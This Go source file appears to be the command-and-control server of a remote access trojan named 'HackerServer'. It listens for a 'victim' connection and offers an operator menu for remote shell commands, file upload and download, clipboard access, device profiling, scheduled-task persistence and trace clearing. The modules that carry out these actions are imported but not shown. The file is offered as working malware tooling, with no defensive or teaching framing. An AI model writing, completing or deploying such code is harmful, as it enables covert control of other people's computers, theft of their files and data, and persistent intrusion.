package main

import (
	"HackerServer/core/ExecuteCommandWindows"
	"HackerServer/core/Move"
	"HackerServer/core/Upload"
	"HackerServer/core/alert"
	"HackerServer/core/audio"
	"HackerServer/core/clipboard"
	"HackerServer/core/device"
	"HackerServer/core/download"
	"HackerServer/core/handleConnection"
	"HackerServer/core/persist"
	"HackerServer/core/wall"
	"bufio"
	"os"
	"strings"

	"fmt"
	"log"
)

func options() {
	fmt.Println()
	fmt.Println("=======================================================")
	fmt.Println("\n[+] shell  \t:\tExecute any system commands")
	fmt.Println("[+] navigate  \t:\tFile System Navigation")
	fmt.Println("[+] upload  \t:\tUpload a file to Client")
	fmt.Println("[+] download  \t:\tDownload a file from Client")
	fmt.Println("[+] persist  \t:\tadd a persistance schedule task")
	fmt.Println("[+] disarm  \t:\tremoves the persistance")
	fmt.Println("[+] snap \t:\tSaves screen in Appdata/Roaming")
	fmt.Println("[+] alert \t:\tPops up an Alert Dialog box")
	fmt.Println("[+] clipboard \t:\tread or write to\\from Client clipboard")
	fmt.Println("[+] make_noise \t:\tplays audio file from host till told to")
	fmt.Println("[+] wallpaper \t:\tSet wallpaper from url")
	fmt.Println("[+] device_info \t:\tDisplays Client info")
	fmt.Println("[+] appdata \t:\tcd to appdata of user")
	fmt.Println("[+] clear \t:\tClear terminal screen")
	fmt.Println("[+] disarm&exit \t:\tClear traces and close connection")
	fmt.Println("[+] exit \t:\tExit the Server\n")
	fmt.Println("=======================================================")
}

func DisplayError(err error) {
	if err != nil {
		fmt.Println(err)
	}
}

func main() {
	IP := "0.0.0.0"
	Port := "9090"
	fmt.Print("\033[H\033[2J")
	fmt.Println("\nServing on " + IP + ":" + Port + "...")
	connection, err := handleConnection.ConnectWithVictim(IP, Port)
	if err != nil {
		log.Fatal(err)
	}
	defer connection.Close()
	fmt.Println("\n[+] Connection established with ", connection.RemoteAddr().String(), "\n")

	reader := bufio.NewReader(os.Stdin)

	loopControl := true

	for loopControl {
		fmt.Printf("Fire > ")
		user_input_raw, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println(err)
			continue
		}

		connection.Write([]byte(user_input_raw))

		user_input := strings.TrimSpace(user_input_raw)

		switch {
		case user_input == "shell":
			fmt.Print("\033[H\033[2J")
			fmt.Println("\n[+] Command Execution program\n")
			err := ExecuteCommandWindows.ExecuteCommandRemotelyWindows(connection)
			DisplayError(err)

		case user_input == "navigate":
			fmt.Print("\033[H\033[2J")
			fmt.Println("\n[+] Navigating File system on Victim\n")
			err = Move.NavigateFileSystem(connection)
			DisplayError(err)

		case user_input == "upload":
			fmt.Println("[+] Uploading File to the Victim")
			err = Upload.UploadFile2Victim(connection)
			DisplayError(err)

		case user_input == "download":
			fmt.Print("\033[H\033[2J")
			fmt.Println("\n[+] Downloading File from the victim\n")
			err = download.DownloadFromVictim(connection)
			DisplayError(err)

		case user_input == "snap":
			fmt.Println("\n[+] Trying for snap\n")

		case user_input == "alert":
			fmt.Println("\n[+] Popping up\n")
			err = alert.Dialog(connection)
			DisplayError(err)

		case user_input == "wallpaper":
			fmt.Println("[+] Trying to change wall")
			err = wall.Url(connection)
			DisplayError(err)

		case user_input == "clipboard":
			fmt.Println("[+] Trying to clipboard wright")
			err = clipboard.Write(connection)
			DisplayError(err)

		case user_input == "make_noise":
			fmt.Println("[+] Trying to make some noise...")
			err = audio.Play(connection)
			DisplayError(err)

		case user_input == "persist":
			fmt.Println("[+] Make base under appdata")
			err = persist.Schedule(connection)
			DisplayError(err)

		case user_input == "disarm&exit":
			fmt.Println("[+] removing persistance")
			err = persist.Remove(connection)
			DisplayError(err)

		case user_input == "device_info":
			fmt.Println("[+] Fetching Device info")
			err = device.Info(connection)
			DisplayError(err)

		case user_input == "appdata":
			fmt.Println("[+] Changing dir to Appdata")

		case user_input == "exit":
			fmt.Println("[+] Exiting the program\n")
			loopControl = false

		case user_input == "clear" || user_input == "cls":
			fmt.Println("\033[H\033[2J")

		case user_input == "help":
			options()

		default:
			fmt.Println("[-] Invalid command")
		}

	}

}
